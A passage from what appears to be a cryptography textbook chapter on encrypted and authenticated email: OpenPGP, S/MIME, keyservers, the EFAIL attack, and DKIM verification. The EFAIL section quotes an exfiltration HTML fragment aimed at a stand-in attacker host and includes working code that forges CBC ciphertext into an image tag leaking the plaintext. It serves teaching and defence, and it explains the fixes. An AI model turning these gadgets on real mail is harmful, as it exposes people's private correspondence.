literal = list(packets(plain))[0][1]
print("literal data:", literal[6:].decode())
final_ad = info + len(plain).to_bytes(8, "big")
print("final tag (total length", len(plain), "bytes) checks:", ocb(mkey, iv + (1).to_bytes(8, "big"), final_tag, final_ad, decrypt=True) == b"")

# 3. The final tag also covers the total length: an attacker who cuts chunks off the end
#    cannot make a valid final tag for the shorter length.
short_ad = info + (16).to_bytes(8, "big")              # pretend only 16 bytes were sent
print("same final tag, claimed length 16:", ocb(mkey, iv + (1).to_bytes(8, "big"), final_tag, short_ad, decrypt=True) == b"")
```

```text
PKESK for subkey 12c83f1e706f6308...  algorithm 25 (X25519)
shared point 67e30e69cdc7bab2... True
session key  dd708f6fa1ed65114d68d2343e7c2f1d True
chunk 0 decrypts: True
literal data: Hello, world!
final tag (total length 37 bytes) checks: True
same final tag, claimed length 16: False
```

Every intermediate value matches the RFC: the shared point starts 67e30e69,
the session key is dd708f6f…. The last line is the truncation defence at
work: the attacker who cuts a message short must also produce a final tag for
the shorter length, and cannot without the message key.

!!! tip "Why so many layers?"
    X25519 gives a shared secret; HKDF turns it into a uniformly random key and
    binds in both public keys and the algorithm name (so the same secret cannot
    be used in another context); key wrap seals the 16-byte session key with a
    built-in integrity check. Then a second HKDF, with a fresh salt, gives each
    message its own key even if a session key were ever reused. Each layer is
    simple and has one job, which is what you want in a format that will be
    read for decades.

## 15.4 Trusting a key

*Level: intermediate.*

Everything above assumes that the certificate really belongs to the person
named in it. Here OpenPGP and S/MIME differ completely.

**The web of trust.** Zimmermann's idea was that people would vouch for each
other. If Carol has checked Bob's fingerprint in person, she signs Bob's user
ID with her own key (a **certification**, signature type 0x10 to 0x13). Alice,
who trusts Carol to check carefully, accepts Bob's key because it carries
Carol's certification. GnuPG computes validity this way: a key is valid if
one fully trusted or three marginally trusted introducers certified it, with
paths of up to five steps by default. Users met at **key-signing parties**,
read fingerprints aloud, checked passports and went home to sign.

It worked for a community of developers who met at conferences. Debian, for
example, still builds its developers' keyring from in-person checks. For
everyone else it did not: most users never signed a key, and a signature from
a stranger you have no reason to trust tells you nothing.

**Keyservers.** To find keys, people uploaded them to public **keyservers**.
The SKS network, which synchronized keys between dozens of servers worldwide,
was built on a design rule: never delete anything, so that a government could
not quietly remove a key. Anyone could add a certification to anyone's key.

In June 2019 someone used that rule against two well-known members of the
community, Robert J. Hansen and Daniel Kahn Gillmor: they attached tens of
thousands of junk certifications to their keys. The keys spread through the
network as designed, and GnuPG, which processed every certification when
importing, hung or became unusable for anyone who fetched them. Since SKS
could not delete, the poisoned keys could not be repaired. The attack had been
predicted for years.

!!! note "Life story: the SKS keyserver network"
    **Born:** the early 2000s, Yaron Minsky's SKS software, with servers
    run by volunteers that reconciled their key sets with each other ·
    **Purpose:** a censorship-resistant public directory of OpenPGP keys ·
    **Weakness:** append-only by design, no check that the person uploading a
    key or signature had anything to do with it, and no way to delete;
    privacy law (the EU's right to erasure) could not be honored either ·
    **Attacked:** June 2019, certificate flooding of public figures in the
    OpenPGP community · **Status:** the main pool shut down in 2021;
    keys.openpgp.org (2019) replaced it for most users, publishing a user ID
    only after emailing the address and stripping third-party certifications

**What replaced it.** Key discovery today is tied to email addresses:

- **keys.openpgp.org** sends a confirmation mail before it lists a user ID, so
  a lookup by address returns only keys whose owner could read that mailbox.
- **Web Key Directory (WKD)** puts keys on the domain's own web server, at a
  URL derived from the hashed local part of the address. A domain vouches for
  its users, as a mail server already does.
- **Autocrypt** (2017) attaches the sender's key to the headers of every
  message and encrypts when both sides have seen each other's keys:
  **trust on first use**, like SSH (Chapter 6), with fingerprints to compare
  if you want more.
- **Fingerprint checks** remain the strong option: read the fingerprint aloud,
  or scan a QR code, as Signal's safety numbers do (Chapter 16).

**S/MIME's answer** is the one TLS uses: a certificate authority checks that
you control the address and signs an X.509 certificate with your address in
the subjectAltName and the `emailProtection` extended key usage. Since
September 2023 public CAs follow the CA/Browser Forum's S/MIME Baseline
Requirements, which set validation methods and key sizes. Inside companies,
the company runs the CA and publishes certificates in its directory, and this
is where S/MIME is most used.

## 15.5 S/MIME and CMS

*Level: intermediate.*

S/MIME (Secure/MIME) began at RSA Data Security in 1995. It is built on the
**Cryptographic Message Syntax** (CMS, RFC 5652), the successor of PKCS #7,
the same ASN.1 structure that signs Windows code, PDF documents and PKINIT
messages in Kerberos (Chapter 12). A signed message is CMS **SignedData**; an
encrypted one is **EnvelopedData** (CBC, no integrity) or, since RFC 5083,
**AuthEnvelopedData** (GCM). S/MIME 4.0 is RFC 8551 (2019).

Here is real output from OpenSSL 3.0.13, from a test with a throwaway CA that
gave Alice a P-256 certificate and Bob an RSA-2048 one. Alice signed a note,
then encrypted it to Bob and to herself (output trimmed):

```text
$ openssl cms -encrypt -aes-256-gcm -in signed.eml \
    -recip bob.crt -keyopt rsa_padding_mode:oaep -keyopt rsa_oaep_md:sha256 \
    -recip alice.crt -keyopt ecdh_kdf_md:sha256 -out enc.eml
$ openssl cms -cmsout -print -inform SMIME -in enc.eml
  contentType: id-smime-ct-authEnvelopedData (1.2.840.113549.1.9.16.1.23)
      d.ktri:
          algorithm: rsaesOaep (1.2.840.113549.1.1.7)
      d.kari:
          algorithm: dhSinglePass-stdDH-sha256kdf-scheme (1.3.132.1.11.1)
    2:d=1  hl=2 l=   9 prim:  OBJECT            :id-aes256-wrap
        algorithm: aes-256-gcm (2.16.840.1.101.3.4.1.46)
    2:d=1  hl=2 l=  12 prim:  OCTET STRING      [HEX DUMP]:4AC1263A8834DD3D7B71D19D
   16:d=1  hl=2 l=   1 prim:  INTEGER           :10
    mac:
```

Read it top down. The content is AuthEnvelopedData. Bob's copy of the content
key is in a **KeyTransRecipientInfo** (`ktri`), encrypted with RSA-OAEP.
Alice's is in a **KeyAgreeRecipientInfo** (`kari`): a fresh P-256 key, ECDH
with her certificate's key, the X9.63 KDF with SHA-256, and AES-256 key wrap,
the same pattern as OpenPGP's X25519 packet. The content is AES-256-GCM with a
12-byte nonce (the hex dump) and a 16-byte tag (`INTEGER :10`), stored in the
`mac` field.

**The signature** sits inside. S/MIME does not sign the message body
directly: it hashes the MIME part into a `messageDigest` attribute, puts it
next to `contentType`, `signingTime` and `SMIMECapabilities`, and signs the
DER encoding of those **signed attributes** (RFC 5652 §5.4). After
decryption:

```text
          algorithm: sha256 (2.16.840.1.101.3.4.2.1)
            object: messageDigest (1.2.840.113549.1.9.4)
            object: S/MIME Capabilities (1.2.840.113549.1.9.15)
          algorithm: ecdsa-with-SHA256 (1.2.840.10045.4.3.2)
```

**Why GCM had to be asked for.** Run without `-aes-256-gcm`, this OpenSSL
version wrote EnvelopedData with 3DES and RSA PKCS#1 v1.5 key transport.
(OpenSSL 3.5, April 2025, changed the default to AES-256-CBC.) And the
capabilities list Alice's signature announced, which tells her
correspondents what she can read, most preferred first, was:

```text
:aes-256-cbc :aes-192-cbc :aes-128-cbc :des-ede3-cbc :rc2-cbc :80 :rc2-cbc :40 :des-cbc :rc2-cbc :28
```

That is OpenSSL's built-in list: CBC ciphers only, down to RC2 with a 40-bit
key (hex 28), a relic of the export rules of the 1990s. A client that follows
RFC 8551 answers her with AES-256-CBC, because with no handshake it uses only
what she says she can read. This is what "no negotiation" means in practice:
a format can add strong options, but each message uses what the slowest
correspondent last advertised.

Each S/MIME version raised the cipher every client must support: RC2 with a
40-bit key in v2 (RFC 2311, 1998), 3DES in v3 (RFC 2633, 1999), AES-128-CBC
in v3.2 (RFC 5751, 2010), AES-GCM in 4.0 (RFC 8551, 2019). The last step came
from the attack in the next section.

## 15.6 Break it: EFAIL

*Level: intermediate.*

In May 2018 a team from Münster University of Applied Sciences, Ruhr
University Bochum and KU Leuven (Damian Poddebniak, Christian Dresen, Jens
Müller, Fabian Ising, Sebastian Schinzel, Simon Friedberger, Juraj Somorovsky
and Jörg Schwenk) published **EFAIL**: a way to make a victim's own mail
client decrypt an old encrypted message and send the plaintext to the
attacker. The attacker needs a copy of the ciphertext (from a compromised
mail server, a backup or a tapped link) and the ability to send the victim
one email. No key is needed.

There were two attacks.

**Direct exfiltration** needed no cryptography at all. The attacker builds a
new message with three MIME parts: an HTML part containing
`<img src="http://attacker.example/`, the captured encrypted part, and an HTML
part containing `">`. Many clients decrypted the middle part and then
rendered the three parts as one HTML document, so the plaintext became part
of an image URL, and loading the image sent it to the attacker. Apple Mail,
iOS Mail and Thunderbird were among those affected.

**Malleability gadgets** worked even against clients that kept the parts
apart. They use the property of CBC mode that the
[Attacks on modes and MACs](../cryptanalysis/10-Attacks-on-Modes-and-MACs.md)
chapter of the Cryptanalysis book develops: decryption is

$$
P_i = D_K(C_i) \oplus C_{i-1},
$$

so flipping bits in $C_{i-1}$ flips the same bits in $P_i$, at the price of
turning $P_{i-1}$ into random bytes. If the attacker also *knows* one
plaintext block, they get far more than bit flips. Say the first block $P_0$
is known, with initialization vector $IV$. Then $D_K(C_0) = P_0 \oplus IV$,
and for any 16 bytes $X$ the attacker likes, the pair of blocks

$$
\bigl(IV \oplus P_0 \oplus X,\; C_0\bigr)
$$

decrypts to $X$ in its second position. The pair is a **gadget**: a reusable
piece that prints chosen text. Repeated, it writes any HTML the attacker
wants, with a block of random bytes before each chosen block. The attacker
arranges the HTML so the random blocks fall where they do no harm, inside an
attribute value or a URL.

And the first block of an S/MIME message is known: it is a MIME header such
as `Content-type: multipart/signed`. In OpenPGP, CFB mode has the same
property, and the first bytes are the predictable packet headers.

<figure class="mars-fig">
<svg viewBox="0 0 640 300" width="640" role="img" aria-label="The CBC gadget: the attacker replaces the IV with IV xor known block xor chosen text; decrypting the first ciphertext block then gives the chosen text instead of the known header" fill="currentColor" font-size="13">
<text x="20" y="26" font-weight="bold">Original</text>
<rect x="20" y="40" width="110" height="36" rx="5" class="soft" stroke="currentColor"/>
<text x="75" y="63" text-anchor="middle">IV</text>
<rect x="160" y="40" width="110" height="36" rx="5" class="soft" stroke="currentColor"/>
<text x="215" y="63" text-anchor="middle">C₀</text>
<line x1="215" y1="78" x2="215" y2="96" stroke="currentColor"/><rect x="175" y="96" width="80" height="28" rx="4" stroke="currentColor" fill="none"/>
<text x="215" y="115" text-anchor="middle" font-size="12">AES⁻¹</text>
<line x1="75" y1="78" x2="75" y2="140" stroke="currentColor"/><line x1="75" y1="140" x2="203" y2="140" stroke="currentColor"/>
<line x1="215" y1="126" x2="215" y2="132" stroke="currentColor"/><circle cx="215" cy="140" r="8" fill="none" stroke="currentColor"/><text x="215" y="145" text-anchor="middle">+</text>
<line x1="215" y1="150" x2="215" y2="166" stroke="currentColor"/>
<rect x="140" y="168" width="150" height="34" rx="5" class="soft" stroke="currentColor"/>
<text x="215" y="190" text-anchor="middle" font-size="12">"Content-type: mu"</text>
<text x="340" y="26" font-weight="bold">Forged, no key needed</text>
<rect x="340" y="40" width="130" height="36" rx="5" class="soft-acc" stroke="currentColor"/>
<text x="405" y="58" text-anchor="middle" font-size="11.5">IV ⊕ known</text>
<text x="405" y="71" text-anchor="middle" font-size="11.5">⊕ chosen</text>
<rect x="500" y="40" width="110" height="36" rx="5" class="soft" stroke="currentColor"/>
<text x="555" y="63" text-anchor="middle">C₀</text>
<line x1="555" y1="78" x2="555" y2="96" stroke="currentColor"/><rect x="515" y="96" width="80" height="28" rx="4" stroke="currentColor" fill="none"/>
<text x="555" y="115" text-anchor="middle" font-size="12">AES⁻¹</text>
<line x1="405" y1="78" x2="405" y2="140" stroke="currentColor"/><line x1="405" y1="140" x2="543" y2="140" stroke="currentColor"/>
<line x1="555" y1="126" x2="555" y2="132" stroke="currentColor"/><circle cx="555" cy="140" r="8" fill="none" stroke="currentColor"/><text x="555" y="145" text-anchor="middle">+</text>
<line x1="555" y1="150" x2="555" y2="166" stroke="currentColor"/>
<rect x="470" y="168" width="150" height="34" rx="5" class="acc-fill" fill-opacity="0.25" stroke="currentColor"/>
<text x="545" y="190" text-anchor="middle" font-size="12">'&lt;img alt="......'</text>
<rect x="20" y="222" width="600" height="66" rx="6" class="soft" stroke="currentColor"/>
<text x="36" y="244" font-size="12.5">AES⁻¹(C₀) = IV ⊕ known never changes. XOR it with any 16 bytes you put in front of C₀</text>
<text x="36" y="262" font-size="12.5">and you get IV ⊕ known ⊕ that block. Choose the block, choose the plaintext.</text>
<text x="36" y="280" font-size="12.5">CBC has no check, so the mail client decrypts the forgery without complaint.</text>
</svg>
<figcaption>Figure 15.3. The CBC gadget at the heart of EFAIL. One known block becomes a printer for chosen text.</figcaption>
</figure>

### Code it: an EFAIL gadget

The program encrypts a short message with AES-128-CBC under a key the
attacker never sees. Knowing only the ciphertext, the IV and the first 16
bytes of plaintext, it builds a longer ciphertext that decrypts to an HTML
image tag whose URL contains the secret message, then tries the same splice
on an OCB ciphertext.

```python
# EFAIL's CBC gadget (2018): without the key, an attacker who knows one block of
# plaintext can make two cipher blocks decrypt to any 16 bytes they like.
# Uses aes, expand, xor and ocb from above.
import hashlib

def cbc_encrypt(key, iv, data):
    rk, prev, out = expand(key), iv, b""
    data += bytes([16 - len(data) % 16]) * (16 - len(data) % 16)
    for i in range(0, len(data), 16):
        prev = aes(rk, xor(data[i:i + 16], prev)); out += prev
    return out
def cbc_decrypt(key, iv, data):
    rk, prev, out = expand(key), iv, b""
    for i in range(0, len(data), 16):
        out += xor(aes(rk, data[i:i + 16], True), prev); prev = data[i:i + 16]
    return out

key = hashlib.sha256(b"mission key").digest()[:16]    # fixed so the output repeats
iv = hashlib.sha256(b"mission iv").digest()[:16]
secret = b"Content-type: multipart/mixed\r\n\r\nThe landing site moves to Jezero B."
c = cbc_encrypt(key, iv, secret)              # what the attacker captured, with iv

# The attacker knows the first block: every S/MIME body starts the same way.
known = b"Content-type: mu"
def gadget(want):                             # block X such that X, c0 decrypts to `want`
    return xor(xor(iv, known), want)
c0 = c[:16]

# Chosen block, then a block that decrypts to junk, and so on. The junk lands
# inside an attribute or the URL, where HTML does not mind it.
x1 = gadget(b'<img alt="......')
x2 = gadget(b'"src="//x.test/?')
x3 = gadget(b'">' + bytes([14]) * 14)         # last block: closes the tag, valid padding
forged_iv, forged = x1, c0 + x2 + c0 + iv + c + x3 + c0
print("forged message:", len(forged), "bytes, made without the key")

p = cbc_decrypt(key, forged_iv, forged)
p = p[:-p[-1]]                                # the client strips the padding
for i in range(0, len(p), 16):
    print(f"  {i // 16:2}", p[i:i + 16])

# With an AEAD mode (OCB here, as in OpenPGP v6) the same splice is refused.
nonce = bytes(12)
sealed = ocb(key, nonce, secret)
spliced = sealed[:16] + sealed[:16] + sealed[16:]
print("OCB, untouched:", ocb(key, nonce, sealed, decrypt=True) == secret)
print("OCB, spliced:  ", ocb(key, nonce, spliced, decrypt=True))
```

```text
forged message: 176 bytes, made without the key
   0 b'<img alt="......'
   1 b'\x94\xdcW\x1c\x08\\\xd2\x13\xb1\xc9\x12\rqHTR'
   2 b'"src="//x.test/?'
   3 b'8\xcd/\t>P\x19\x0e(`/\xe9\xb9L\xe7\x94'
   4 b'Content-type: mu'
   5 b'ltipart/mixed\r\n\r'
   6 b'\nThe landing sit'
   7 b'e moves to Jezer'
   8 b'o B.\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c'
   9 b'\xd5[\xa1F\xd2#\x9e\x9e+\xb5X>\xfd{k\xb8'
  10 b'">'
OCB, untouched: True
OCB, spliced:   None
```

Blocks 1, 3 and 9 are random, and they fall inside the `alt` attribute and
the URL, where a browser does not care. Block 4 onward is the original
message, which ends up in the query string of a request to `x.test`. The
client sees a well-formed message and loads the image. Against OCB the
spliced ciphertext is simply refused: the tag covers every block in order.

!!! note "Life story: EFAIL"
    **Born:** disclosed 14 May 2018 (a day early, after the embargo broke),
    presented at USENIX Security 2018 · **Purpose:** an attack, showing
    that encrypted mail could be turned into a decryption oracle through the
    mail client's own HTML rendering · **Targets:** S/MIME (CBC, no integrity
    check at all) and OpenPGP (CFB, protected by the Modification Detection
    Code, a SHA-1 hash of the plaintext, which some clients checked too late
    or ignored when GnuPG warned it was missing) · **Response:** clients
    stopped mixing parts and loading remote content by default; GnuPG made a
    missing or bad MDC a hard error; RFC 8551 (2019) made AES-GCM mandatory
    in S/MIME 4.0 and told clients not to act on content before checking its
    integrity; RFC 9580 (2024) made AEAD mandatory in OpenPGP · **Status:**
    fixed in maintained clients; old CBC mail in archives remains malleable

### Fix it

EFAIL was a combination of three faults, and each has its own fix.

1. **Unauthenticated encryption.** CBC and CFB alone let anyone edit the
   ciphertext. The fix is an AEAD mode (GCM in S/MIME's AuthEnvelopedData,
   OCB in OpenPGP's SEIPD v2), so that any change is detected.
2. **Releasing plaintext before checking it.** OpenPGP's MDC was checked at
   the end, after `gpg` had streamed the plaintext to the mail client. The
   chunked design of §15.3 exists so that no unauthenticated byte is ever
   released, even when streaming; a reader must stop at the first bad tag.
3. **Mixing trusted and untrusted content.** A mail client that renders an
   attacker's HTML around a decrypted part has merged two security levels.
   The fix, now in RFC 8551 §6, is to treat each protected part as a
   separate document, and not to load remote content in encrypted mail.

The same lesson appears in every chapter of this book's Part I: in TLS,
the Lucky Thirteen and padding-oracle attacks (Chapter 4) came from
decrypting before authenticating; the cure was the same AEAD.

## 15.7 Why email resists end-to-end encryption

*Level: intermediate.*

PGP is more than thirty years old. Encrypted mail remains rare outside
specialists, some companies and a few services that build it in. That is not
for want of good cryptography. The reasons are structural.

**People.** In "Why Johnny Can't Encrypt" (USENIX Security 1999), Alma
Whitten and J. D. Tygar gave twelve people 90 minutes and PGP 5.0, a program
with a good graphical interface for its time, and asked them to send a signed
and encrypted message. Only about a third succeeded; some mailed the secret in
plain text by mistake. Follow-up studies with newer tools found the same: key
management is a concept most people never need anywhere else.

**Metadata.** Headers must stay readable for delivery. The subject line,
which often says as much as the body, is a header. RFC 9788 (2025) defines a
way to put protected copies of headers inside the encrypted part, with a
dummy subject such as "..." outside, but the sender, recipients and timing
remain visible to every server.

**Devices and servers.** Users read mail on several devices, so the private
key must be copied to each, or kept on a server, which then can decrypt.
Server-side search, spam filtering and virus scanning all need the
plaintext. Webmail needs the key in a browser, delivered by the same server
it is meant to protect against.

**No forward secrecy.** A stolen or seized key opens every past message.
Long-lived keys, the very thing that makes mail work, are the opposite of
what Signal does.

**No deniability, and signatures that outlive their purpose.** A signed
message proves to anyone, forever, that the key holder wrote it. For a
contract that is the point; for a private conversation it is a liability.

In July 2019 the security firm Latacora summed this up in "The PGP Problem":
use a messenger for conversations (Chapter 16), `age` for files
(Chapter 18), signify, minisign or Sigstore for software, and stop trying to
make mail secure. That is harsh but widely shared among cryptographers. What
OpenPGP still does best is the job no messenger does: **signing software**.
Debian and Ubuntu sign their package lists with OpenPGP keys, `git` signs
tags and commits, and the Linux kernel's releases are signed. There the
long-lived key and the verifiable signature are features.

And encrypted mail has found niches where it fits: inside organizations with
a directory (S/MIME in Outlook and Apple Mail, keys issued and escrowed by
the company), and in services such as Proton Mail that run OpenPGP for users
who never see a key.

## 15.8 The transport's own signatures: SPF, DKIM and DMARC

*Level: intermediate.*

Most mail is not end-to-end encrypted or signed by its author. But since the
2010s nearly all of it is signed by something else: the **sending domain**.
These checks do not protect the content from the mail servers; they let a
receiver tell whether mail claiming to come from `bank.example` was sent with
that domain's permission. They are the main defense against phishing that
forges a well-known sender. The
[How email is delivered](https://networks.akadian.ca/explainers/Email-Delivery/)
explainer on the networks site follows a message hop by hop; here we look at
the cryptography.

- **SPF** (Sender Policy Framework, RFC 7208, 2014) is not cryptographic. The
  domain publishes in DNS the list of IP addresses allowed to send its mail,
  and the receiver compares the connecting server's address. It breaks when
  mail is forwarded.
- **DKIM** (DomainKeys Identified Mail, RFC 6376, 2011) is a signature. The
  sending server signs a hash of the body and chosen headers with the
  domain's private key and adds a `DKIM-Signature` header. The receiver
  fetches the public key from DNS, at
  `<selector>._domainkey.<domain>`, and verifies. RSA was the original
  algorithm; RFC 8463 (2018) added Ed25519.
- **DMARC** (RFC 7489, 2015) ties them to the address the user sees. The
  domain publishes a policy (`p=none`, `quarantine` or `reject`) saying what
  to do when neither SPF nor DKIM passes for a domain that matches the
  visible From address, and where to send reports.

<figure class="mars-fig">
<svg viewBox="0 0 640 300" width="640" role="img" aria-label="The path of a message: the sender's mail server signs it with the domain's DKIM key; it crosses the Internet; the receiving server looks up the SPF list, the DKIM public key and the DMARC policy in the sender's DNS and checks each" fill="currentColor" font-size="13">
<rect x="20" y="40" width="150" height="56" rx="6" class="soft-acc" stroke="currentColor"/>
<text x="95" y="62" text-anchor="middle">sending server</text>
<text x="95" y="80" text-anchor="middle" font-size="11.5">signs: DKIM-Signature</text>
<rect x="245" y="40" width="150" height="56" rx="6" class="soft" stroke="currentColor"/>
<text x="320" y="62" text-anchor="middle">relays</text>
<text x="320" y="80" text-anchor="middle" font-size="11.5">may forward, add headers</text>
<rect x="470" y="40" width="150" height="56" rx="6" class="soft-acc" stroke="currentColor"/>
<text x="545" y="62" text-anchor="middle">receiving server</text>
<text x="545" y="80" text-anchor="middle" font-size="11.5">checks, then files</text>
<line x1="172" y1="68" x2="241" y2="68" stroke="currentColor" stroke-width="1.5"/><polygon points="243,68 231,63 231,73"/>
<line x1="397" y1="68" x2="466" y2="68" stroke="currentColor" stroke-width="1.5"/><polygon points="468,68 456,63 456,73"/>
<rect x="160" y="150" width="330" height="96" rx="6" stroke="currentColor" fill="none"/>
<text x="325" y="170" text-anchor="middle" font-weight="bold" font-size="12.5">DNS of the From domain</text>
<text x="176" y="192" font-size="12">TXT  "v=spf1 ip4:… -all"  (SPF: allowed IPs)</text>
<text x="176" y="212" font-size="12">TXT  s._domainkey: "p=&lt;public key&gt;"  (DKIM)</text>
<text x="176" y="232" font-size="12">TXT  _dmarc: "p=reject"  (what to do on failure)</text>
<path d="M545 98 C 545 150, 520 190, 494 196" fill="none" stroke="currentColor" stroke-width="1.5" class="acc"/><polygon points="491,197 503,190 503,201" class="acc-fill"/>
<text x="560" y="140" font-size="12" class="acc-fill">looks up</text>
<path d="M95 98 C 95 150, 120 190, 156 196" fill="none" stroke="currentColor" stroke-dasharray="4 4"/>
<text x="20" y="140" font-size="12">publishes</text>
<text x="320" y="282" text-anchor="middle" font-size="12.5">The domain signs, not the person: DKIM says "this server spoke for example.com", nothing about Alice.</text>
</svg>
<figcaption>Figure 15.4. SPF, DKIM and DMARC. Every check reads the sender's DNS, which is why DNSSEC (Chapter 10) matters for mail.</figcaption>
</figure>

### What DKIM signs

A DKIM signature cannot cover the message exactly as sent, because servers
along the way rewrap long header lines, change spacing and add headers.
**Canonicalization** fixes a form that survives this. The common choice,
`c=relaxed/relaxed`, does the following.

- **Headers:** lower-case the name, unfold continuation lines, squeeze runs of
  spaces and tabs to one space, remove spaces around the colon and at the
  end. `Subject: Is dinner ready?` becomes `subject:Is dinner ready?`.
- **Body:** squeeze spaces and tabs inside lines to one space, delete them
  at line ends, delete empty lines at the end, end with one CRLF.

The signature header lists the headers it covers in `h=`, carries the hash
of the canonical body in `bh=`, and the signature in `b=`. What is signed is
the canonical form of each listed header, in the order listed, followed by
the `DKIM-Signature` header itself with the `b=` value emptied. When a header
appears more than once, DKIM takes instances from the bottom up; listing a
header name more times than it appears (`from : subject : date` twice, as in
the example below) **oversigns** it: the absent instance counts as empty, so
an attacker who adds a second `From:` line breaks the signature.

### Code it: verify RFC 8463's example

RFC 8463 signs one message twice, with Ed25519 (selector `brisbane`) and with
RSA-1024 (selector `test`), and publishes the DNS keys. The program
canonicalizes, checks the body hash, rebuilds the signed data and verifies
both signatures, reusing Ed25519 from the first program and a minimal reader
for the RSA key's DER encoding. Note that RFC 8463 signs the SHA-256 hash of
the data with Ed25519, not the data itself.

```python
# DKIM (RFC 6376): the sending domain signs the message, and anyone can check it
# with a key published in DNS. RFC 8463's example carries two signatures, one
# Ed25519 and one RSA; both are verified here. Continue from above.
import re
lines = ["DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed;",
 " d=football.example.com; i=@football.example.com;",
 " q=dns/txt; s=brisbane; t=1528637909; h=from : to :",
 " subject : date : message-id : from : subject : date;",
 " bh=2jUSOH9NhtVGCQWNr9BrIAPreKQjO6Sn7XIkfJVOzv8=;",
 " b=/gCrinpcQOoIfuHNQIbq4pgh9kyIK3AQUdt9OdqQehSwhEIug4D11Bus",
 " Fa3bT3FY5OsU7ZbnKELq+eXdp1Q1Dw==",
 "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;",
 " d=football.example.com; i=@football.example.com;",
 " q=dns/txt; s=test; t=1528637909; h=from : to : subject :",
 " date : message-id : from : subject : date;",
 " bh=2jUSOH9NhtVGCQWNr9BrIAPreKQjO6Sn7XIkfJVOzv8=;",
 " b=F45dVWDfMbQDGHJFlXUNB2HKfbCeLRyhDXgFpEL8GwpsRe0IeIixNTe3",
 " DhCVlUrSjV4BwcVcOF6+FF3Zo9Rpo1tFOeS9mPYQTnGdaSGsgeefOsk2Jz",
 " dA+L10TeYt9BgDfQNZtKdN1WO//KgIqXP7OdEFE4LjFYNcUxZQ4FADY+8=",
 "From: Joe SixPack <joe@football.example.com>",
 "To: Suzie Q <suzie@shopping.example.net>",
 "Subject: Is dinner ready?",
 "Date: Fri, 11 Jul 2003 21:00:37 -0700 (PDT)",
 "Message-ID: <20030712040037.46341.5F8J@football.example.com>",
 "", "Hi.", "", "We lost the game.  Are you hungry yet?", "", "Joe.", ""]
message = "\r\n".join(lines) + "\r\n"

# DNS: brisbane._domainkey and test._domainkey under football.example.com
DNS = {"brisbane": "11qYAYKxCrfVS/7TyWQHOg7hcvPapiMlrwIaaPcHURo=",
       "test": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDkHlOQoBTzWRiGs5V6NpP3idY6Wk08a5qhdR6wy5bdOKb2jLQiY/J16JYi0Qvx/byY"
               "zCNb3W91y3FutACDfzwQ/BC/e/8uBsCR+yz1Lxj+PL6lHvqMKrM3rG4hstT5QjvHO9PzoxZyVYLzBfO2EeC3Ip3G+2kryOTIKT+l/K4w3QIDAQAB"}

def relaxed_body(body):                               # RFC 6376 section 3.4.4
    out = [re.sub(r"[ \t]+", " ", l).rstrip(" ") for l in body.split("\r\n")]
    while out and out[-1] == "": out.pop()
    return "\r\n".join(out) + "\r\n"
def relaxed_header(name, value):                      # section 3.4.2
    value = re.sub(r"[ \t]+", " ", value.replace("\r\n", "")).strip()
    return name.lower().strip() + ":" + value

head, body = message.split("\r\n\r\n", 1)
fields = []                                           # (name, raw value), unfolded later
for line in head.split("\r\n"):
    if line[0] in " \t": fields[-1][1] += "\r\n" + line
    else: n, v = line.split(":", 1); fields.append([n, v])

def rsa_from_spki(der):                               # just enough DER for an RSA key
    def tlv(b, i):
        n, i = b[i + 1], i + 2
        if n & 0x80: k = n & 0x7F; n, i = int.from_bytes(b[i:i + k], "big"), i + k
        return b[i:i + n], i + n
    seq, _ = tlv(der, 0); _, i = tlv(seq, 0); bits, _ = tlv(seq, i)
    key, _ = tlv(bits[1:], 0); n, i = tlv(key, 0); e, _ = tlv(key, i)
    return int.from_bytes(n, "big"), int.from_bytes(e, "big")

for which, (name, raw) in enumerate([f for f in fields if f[0].lower() == "dkim-signature"]):
    tags = {k.strip(): re.sub(r"\s+", "", v) for k, v in (t.split("=", 1) for t in raw.split(";") if "=" in t)}
    bh = base64.b64encode(hashlib.sha256(relaxed_body(body).encode()).digest()).decode()
    data, used = "", {}
    for h in tags["h"].split(":"):                    # bottom-up instances, absent ones skipped
        same = [f for f in fields if f[0].lower() == h]
        used[h] = used.get(h, 0) + 1
        if used[h] <= len(same):
            f = same[-used[h]]
            data += relaxed_header(*f) + "\r\n"
    data += relaxed_header(name, re.sub(r"b=[^;]*", "b=", raw))   # itself, with b= emptied
    sig = base64.b64decode(tags["b"])
    key = base64.b64decode(DNS[tags["s"]])
    if tags["a"] == "ed25519-sha256":                 # RFC 8463: Ed25519 over the SHA-256 hash
        ok = ed25519_verify(key, hashlib.sha256(data.encode()).digest(), sig)
    else:
        n, e = rsa_from_spki(key)
        t = bytes.fromhex("3031300d060960864801650304020105000420") + hashlib.sha256(data.encode()).digest()
        k = (n.bit_length() + 7) // 8
        ok = pow(int.from_bytes(sig, "big"), e, n).to_bytes(k, "big") == b"\x00\x01" + b"\xff" * (k - len(t) - 3) + b"\x00" + t
    print(f"{tags['a']:15} s={tags['s']:9} body hash matches: {bh == tags['bh']}   signature verifies: {ok}")

tampered = relaxed_body(body.replace("hungry", "angry"))
print("body changed to 'angry': body hash matches:",
      base64.b64encode(hashlib.sha256(tampered.encode()).digest()).decode() == tags["bh"])
```

```text
ed25519-sha256  s=brisbane  body hash matches: True   signature verifies: True
rsa-sha256      s=test      body hash matches: True   signature verifies: True
body changed to 'angry': body hash matches: False
```

Both verify. Changing one word in the body changes the body hash, so the
signature check fails without even reaching the public-key operation.

!!! note "Life story: the 512-bit DKIM keys of 2012"
    **Born:** DKIM, RFC 4871 (2007) and RFC 6376 (2011), merging Yahoo's
    DomainKeys and Cisco's Identified Internet Mail · **Event:** in 2012 the
    mathematician Zachary Harris received a recruiting email from Google,
    noticed its DKIM key was only 512 bits, and factored it with a few days
    of rented cloud computing. He sent Google's founders mail that passed
    DKIM as if from each other. He then found 384-, 512- and 768-bit DKIM
    keys at other large companies, among them Yahoo, eBay, PayPal, Amazon and
    Twitter · **Response:** Google moved to 2048-bit keys within days; US-CERT
    issued an advisory · **Status:** RFC 8301 (2018) requires at
    least 1024-bit RSA keys and recommends 2048; RFC 8463 added Ed25519,
    whose 32-byte public key also fits easily in a DNS record

**An unintended property.** DKIM was designed to stop spam and forgery in
transit, but its signatures do not expire. A DKIM-signed message proves,
years later, that the domain's server sent it. Journalists have used that to
authenticate leaked emails. Matthew Green proposed in 2020 that providers
